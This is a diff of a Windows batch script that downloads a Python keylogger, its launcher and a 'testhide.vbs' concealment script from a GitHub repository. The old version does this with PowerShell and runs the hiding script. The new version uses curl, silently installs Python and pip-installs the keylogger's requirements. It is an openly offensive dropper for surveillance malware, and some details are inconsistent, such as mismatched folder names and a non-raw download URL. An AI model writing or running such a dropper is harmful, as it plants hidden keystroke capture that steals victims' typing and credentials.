@@ -1,6 +1,10 @@
 @echo off
-mkdir %USERPROFILE%\.keylog > NUL
-powershell –c "(new-object System.Net.WebClient).DownloadFile('https://github.com/Raikster/keylogger_python/keylogger.py','%USERPROFILE%\.keylog\keylogger.py')"
-powershell –c "(new-object System.Net.WebClient).DownloadFile('https://github.com/Raikster/keylogger_python/keylogger_start.bat','%USERPROFILE%\.keylog\keylogger_start.bat')"
-powershell –c "(new-object System.Net.WebClient).DownloadFile('https://github.com/Raikster/keylogger_python/testhide.vbs','%USERPROFILE%\.keylog\testhide.vbs')"
-wscript //e:vbscript '%USERPROFILE%\.keylog\testhide.vbs'
+if not exist "%UserProfile%\.keylogger" mkdir "%UserProfile%\.keylog"
+cd %UserProfile%\.keylog
+curl "https://github.com/Raikster/keylogger_python/blob/main/keylogger.py" --output keylogger.py
+curl "https://github.com/Raikster/keylogger_python/keylogger_start.bat" --output keylogger_start.bat
+curl "https://github.com/Raikster/keylogger_python/testhide.vbs" --output testhide.vbs
+curl "https://github.com/Raikster/keylogger_python/requirements.txt" --output requirements.txt
+curl "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe" --output python396.exe
+start /wait python396.exe /quiet InstallAllUsers=0 Include_launcher=0 Include_pip=1 Include_test=0 SimpleInstall=1
+pip install -r requirements.txt
